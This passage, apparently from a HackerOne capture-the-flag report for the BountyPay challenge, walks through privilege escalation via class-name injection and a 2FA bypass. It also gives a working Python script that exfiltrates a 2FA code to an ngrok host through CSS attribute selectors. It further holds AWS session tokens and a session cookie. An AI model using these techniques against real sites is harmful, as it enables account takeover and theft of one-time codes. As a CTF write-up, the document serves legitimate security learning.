;X-Amz-Signature=a8e810f267a695ef455d9b8d423c34efc37291c40b6aa7c07e414f36c507d845\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/MSb6H3DttrM1mMMQThR4HTkh?response-content-disposition=attachment%3B%20filename%3D%22Picture5.png%22%3B%20filename%2A%3DUTF-8%27%27Picture5.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=a8e810f267a695ef455d9b8d423c34efc37291c40b6aa7c07e414f36c507d845\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"privilege-escalation\"\u003ePrivilege escalation:\u003c/h2\u003e\n\n\u003cp\u003eAfter playing around with the staff application I figured I had the following options: updating the profile and avatar, contacting admin through support section but comments were disabled and reporting any page to the admin which will be visited by the admin (except if the page started with /admin). I have tried many attacks at this stage:\u003cbr\u003e\n×  sending blind XSS payloads when reporting from all pages\u003cbr\u003e\n×  modifying avatar name to xss payloads (but good filters were implemented) \u003cbr\u003e\n×  changing my name to “admin” \u003cbr\u003e\n×  trying to report a page that will update my account’s rights to admin but without starting with admin endpoint \u003ccode\u003ehttps://staff.bountypay.h1ctf.com/admin/report?url=Ly4uL0FETUlOL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJh\u003c/code\u003e  (/../ADMIN/upgrade?username=sandra). \u003c/p\u003e\n\n\u003cp\u003eAll of this was useless, so I had to change my approach. \u003c/p\u003e\n\n\u003cp\u003eBack to the staff application, I found an interesting javascript file located at: \u003ccode\u003ehttps://staff.bountypay.h1ctf.com/js/website.js\u003c/code\u003e.\u003cbr\u003e\nA deep analysis of this file showed me that visiting \u003ccode\u003eURL/#tab4\u003c/code\u003e will load the hash location of that page and trigger any existing function on that page \u003ccode\u003e($(\u0026quot;.tab4\u0026quot;).trigger(\u0026quot;click\u0026quot;)))\u003c/code\u003e. \u003cbr\u003e\nSince I wanted to trigger the \u003ccode\u003eupgradeToAdmin\u003c/code\u003e function, I needed a place to insert \u003ccode\u003etab4\u003c/code\u003e and \u003ccode\u003eupgradeToAdmin\u003c/code\u003e so when I visited this page the function be triggered. Avatar name seemed like a good place to inject that payload since it will be reflected inside avatar class: \u003ccode\u003e\u0026lt;div style=\u0026quot;margin:auto\u0026quot; class=\u0026quot;avatar tab4 upgradeToAdmin\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eI then visited this link \u003ccode\u003ehttps://staff.bountypay.h1ctf.com/#tab4\u003c/code\u003e and indeed a GET request is sent to \u003ccode\u003eadmin/upgrade?username=undefined\u003c/code\u003e. Here username is set to undefined because we don’t have a field with this name. After looking for a page that reflects username I discovered the following page: \u003ccode\u003ehttps://staff.bountypay.h1ctf.com/?template=login\u0026amp;username=sandra.allison\u003c/code\u003e. \u003c/p\u003e\n\n\u003cp\u003eAt this point, I needed to chain these two findings, so I tried to load the two templates (home and login) on the same page using the fact that query string accepts an array parameter. So, the following request did the trick for me: \u003ccode\u003ehttps://staff.bountypay.h1ctf.com/?template[]=home\u0026amp;template[]=login\u0026amp;username=sandra.allison\u003c/code\u003e\u003cbr\u003e\nFinally, to update Sandra’s rights to become an “admin” I sent following request: \u003ccode\u003ehttps://staff.bountypay.h1ctf.com/?template[]=home\u0026amp;template[]=login\u0026amp;username=sandra.allison#tab4\u003c/code\u003e\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture6.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4q3kKh7ziB8Nonnxna5LQNyP?response-content-disposition=attachment%3B%20filename%3D%22Picture6.png%22%3B%20filename%2A%3DUTF-8%27%27Picture6.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=f623713467b556bf83037949db1ebf181d1980fbf584c95331c26e290f01ca2a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4q3kKh7ziB8Nonnxna5LQNyP?response-content-disposition=attachment%3B%20filename%3D%22Picture6.png%22%3B%20filename%2A%3DUTF-8%27%27Picture6.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=f623713467b556bf83037949db1ebf181d1980fbf584c95331c26e290f01ca2a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003cbr\u003e\nAfter I got admin access, I found Marten’s password stored in plaintext: \u003ccode\u003eh\u0026amp;H5wy2Lggj*kKn4OD\u0026amp;Ype\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003eYou’re welcome, Marten!\u003c/p\u003e\n\n\u003ch1 id=\"injecting-the-uninjectable\"\u003eInjecting the uninjectable!\u003c/h1\u003e\n\n\u003cp\u003eAfter logging in with Marten password on \u003ccode\u003ehttps://app.bountypay.h1ctf.com\u003c/code\u003e, I bypassed the 2FA mechanism the same way as before. \u003cbr\u003e\nWow! I got a smile on my face, I can make the payment now and get the flag and the invite to h1-2006 event. Wait! A 2FA challenge again is needed to make the payment, my bad!\u003cbr\u003e\nWell, after some recon on that part I found that we had two minutes to send a seven-character long \u003ccode\u003echallenge_answer\u003c/code\u003e. Brute forcing here is not a wise option since we are in lack of resources and time. I tried to send a random string with its MD5 as challenge but the challenge seems to be far more complicated.\u003c/p\u003e\n\n\u003cp\u003eI took a step back, and noticed that \u003ccode\u003eapp_style\u003c/code\u003e parameter is sent with a POST request when we hit the “send challenge” button. I immediately fired up my VPS and got a hit from the server with the following \u003ccode\u003eUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36\u003c/code\u003e. \u003cbr\u003e\nA blind SSRF in this context seems to be not applicable. \u003cbr\u003e\nI took a close look at the CSS file that the application is loading when visiting that link, it’s applying some styles to the body and branding “div”. So, what if I host the same file but with different value in the background-color? \u003cbr\u003e\nThe response was unexpected, there were no changes applied to the background of the current page! So, I made the assumption that changes are happening server side. \u003cbr\u003e\nAfter doing some research I came across a nice article by \u003ccode\u003ed0nut\u003c/code\u003e explaining CSS injection attacks \u003ccode\u003e(https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)\u003c/code\u003e\u003cbr\u003e\nTo prove the existence of this vulnerability, I used the following css:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e*[class*=challenge]~*{\n        background:url(https://xyz.ngrok.io/challenge);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis code proves the existence of a class with name challenge.\u003cbr\u003e\nI needed to find the input that will contain the code that is generated by the server, I assumed that that input would start with “code” (since the challenge page is talking about sending a code) and sent the following CSS:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003einput[name^=code]{\n        background:url(https://xyz.ngrok.io/code);\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter doing some brute force on the code name, I figured out that we have seven input in the form of \u003ccode\u003e“code_X”\u003c/code\u003e with X within [1-7].\u003c/p\u003e\n\n\u003ch1 id=\"the-final-exploit\"\u003eThe final exploit:\u003c/h1\u003e\n\n\u003cp\u003eI use the following python script to generate a css file that contains all possible alphanumeric strings combined with each code position and send them to the server, if a value exists for a particular code, the server will request our vps with \u003ccode\u003eposition/code_x_value\u003c/code\u003e, then we parse our logs to get the whole code value . After getting the correct code,a POST request is sent through our proxy and a wonderful congratulation is printed back with the final \u003cmark\u003eFLAG=^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$\u003c/mark\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport string\nimport requests\nimport os, re\nfrom time import sleep\n\nngrok = \u0026quot;https://3369b146412e.ngrok.io/\u0026quot;\nurl = \u0026quot;https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba\u0026quot;\ncookies = {\u0026quot;token\u0026quot;:\u0026quot;eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9\u0026quot;}\nproxies = {\u0026quot;http\u0026quot;:\u0026quot;http://localhost:8080\u0026quot;,\u0026quot;https\u0026quot;:\u0026quot;https://localhost:8080\u0026quot;}\ncss_url = ngrok+\u0026quot;tosend.css\u0026quot;\ndata = {\u0026quot;app_style\u0026quot;:css_url}\nnums = [0,1,2,3,4,5,6,7,8,9]\n\nalphanums = string.ascii_lowercase + string.ascii_uppercase + string.digits + \u0026quot;+/=-_\u0026amp;@*$ \u0026quot;\n\nregex_challenge = \u0026#39;name=\u0026quot;challenge\u0026quot; value=\u0026quot;([a-zA-Z0-9]{32})\u0026quot;\u0026#39;\nregex_timeout = \u0026#39;name=\u0026quot;challenge_timeout\u0026quot; value=\u0026quot;([0-9]+)\u0026quot;\u0026#39;\n\nnum = [1,2,3,4,5,6,7]\n\ndef generate_css():\n    out = \u0026#39;\u0026#39;\n\n    payload4value = \u0026#39;\u0026#39;\u0026#39;\n    input[name^=code_%i][value=\u0026quot;%s\u0026quot;]{\n        background: url(%s%s);\n    }\u0026#39;\u0026#39;\u0026#39;\n\n    for i in num:\n    for j in alphanums:\n            out += payload4value %(i,j,ngrok+str(i)+\u0026quot;/\u0026quot;,j)\n            out += \u0026#39;\\n\u0026#39;\n    \n    f=open(\u0026#39;tosend.css\u0026#39;,\u0026#39;w\u0026#39;)\n    f.write(out)\n    f.close()\n\ndef execute_attack():\n    generate_css()\n    r = requests.post(url, data=data, verify=True, cookies=cookies)\n    sleep(5)\n    cmd = \u0026#39;tail -n7 /private/var/log/apache2/access_log |cut -d\u0026quot; \u0026quot; -f7 |sort \u0026gt;/tmp/hh.txt \u0026amp;\u0026amp; for i in `cat /tmp/hh.txt`; do echo $i |cut -d/ -f3;done| awk \u0026quot;{print}\u0026quot; ORS=\u0026quot;\u0026quot;\u0026#39;\n    code = os.popen(cmd).read()\n\n    challenge = re.search(regex_challenge, r.text).group(1)\n        timeout = re.search(regex_timeout, r.text).group(1)\n    challenge_data={\u0026quot;challenge_timeout\u0026quot;:timeout, \u0026quot;challenge\u0026quot;:challenge, \u0026quot;challenge_answer\u0026quot;:code}\n        r = requests.post(url, data=challenge_data, verify=False, cookies=cookies, proxies=proxies)\n\nexecute_attack()\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Picture7.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UCF4PoEt7mbKRyyJ64z2Lg2o?response-content-disposition=attachment%3B%20filename%3D%22Picture7.png%22%3B%20filename%2A%3DUTF-8%27%27Picture7.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=a286df45e039e94f953eec0a28b58c3359a1a368511da71bda08180db18b454e\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/UCF4PoEt7mbKRyyJ64z2Lg2o?response-content-disposition=attachment%3B%20filename%3D%22Picture7.png%22%3B%20filename%2A%3DUTF-8%27%27Picture7.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070756Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026amp;X-Amz-Signature=a286df45e039e94f953eec0a28b58c3359a1a368511da71bda08180db18b454e\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003ch1 id=\"finally\"\u003eFinally\u003c/h1\u003e\n\n\u003cp\u003eI want to thank you for this amazing CTF, and looking forward to CTFs to come!\u003c/p\u003e\n","weakness":{"id":122,"name":"Improper Privilege Management"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":861464,"file_name":"Picture1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/t4rihVB8WPhCR19aMGDdBgbC?response-content-disposition=attachment%3B%20filename%3D%22Picture1.png%22%3B%20filename%2A%3DUTF-8%27%27Picture1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%2FbuO0f%2FsPEwM9HdRQFytGHqL%2FkQk%2BpNhsgAok7yxwEi9NustpeRTz5rN3XCfxnTv1EQZDTyf2CMkXPxai9miYEyCqEzm95o%2FWji0UokRhJ7nAAvjnFcZZBhzzAlKgj60zmHVd7RAF9FBoKhJw1L8CzEtzHi8Ub%2Fl%2Ff40q%2BnIJGRvCcsv6s8fwns3Q9x9rNOcNC4%2FvQ2W2tcsXBe898Y2j9dQMjAC8oLXDalQ5kwqemq%2FwU67AHfGUTl%2FYDPxs5VQbVM6YbbQPWpACjCZdWNB1X%2BYlCAg6WTSF6hwm9XlUMal0jLt5Ae9Mby3zeF0kXzzliRlv1djJGT18ZKDRpIb6U%2FYP%2FCOvPcZ%2FUXcp7ogmd1yEm6TQJTAPNpn7lyoOOF9531N%2F%2FztCXqmws2n5HlFZs8iPlP3GWFKjEZRsy5DhmrXa8MUEuD9fcCiZMJW80Aq9nKkHrYB8us1vZYBWwuInvS4cRXLQtFsCvvxSgZ3Pc%2FyIg1f4JiqUaR0lsXYqCV2IcbArgLW3ublxMmtJ5ZRv7klB3LmjKFMu9la06KhhLPzw%3D%3D\u0026X-Amz-Signature=1a394bbf11994fa525d3c361106bcf7069fc3cce825d7a57a7041e3ba7fcb3e7","file_size":178869,"type":"image/png"},{"id":861466,"file_name":"Picture2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VswNw4hxpf7UeFLHX7KWnwnr?response-content-disposition=attachment%3B%20filename%3D%22Picture2.png%22%3B%20filename%2A%3DUTF-8%27%27Picture2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVI7RRVDA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070756Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBHEDTSDqGCEjCA9tudGP24dm%2BoWjhn4lvjW9Xdc726YAiBAirG3R3v5iCJWiH96kr3xjgtokc99MedveJtrAC4YPCq0AwhWEAEaDDAxMzYxOTI3NDg0OSIMwzXTJ902cIF5s5YBKpED%2BFkmFklYgSPET%2FOjZR761EJeyNuollWMzL6Eqk6fqlOryiQVTtybXJCV%2BiXs4IKZlZhdEUgfEs%2FPAvZuGC8ev7K5oLyJ5QqWwuAl7vab30rE%2Fc%2B6gA7DaaQR7brCfssJN3parouSEln0TFi%2Bl2%2Fg04wp1RCS7aIs4VD3adDyb35qEbpuQ8cAYPCIvI7AkKNaVq%2BKTzAMk3O4%2FJlAqQIXdBSTWxtRmWJxWRq9BCvLGNHYWxUqU5LgJuqWxRkm6nUVp%2BfeYyy0xqpTqdHXt%2BFFP%2BZc%2BJ8Gvv6F4e8%2B7BU9sbfDeQE29%